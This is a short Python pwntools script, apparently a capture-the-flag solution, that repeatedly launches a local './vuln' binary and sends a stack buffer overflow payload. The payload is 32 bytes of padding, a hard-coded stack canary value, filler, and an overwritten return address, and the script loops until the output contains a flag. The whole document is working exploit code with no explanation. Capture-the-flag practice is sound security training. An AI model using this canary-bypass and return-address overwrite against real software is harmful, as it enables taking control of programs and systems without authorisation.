from pwn import *

flag=''
while(True):

    sh = process("./vuln")

    pad = 'A'*32
    canary="57Gh"
    addr = p32(0x565c97ed)
    extra='b'*16

    print(sh.recvline())
    print(sh.recvuntil('> '))

    exploit=pad + canary + extra + addr 
    sh.sendline(str(len(exploit)))
    sh.recvuntil('Input> ')
    sh.send(exploit)
    flag= sh.recvall()

    if 'flag' in flag:
        print(flag)
        break
        
            
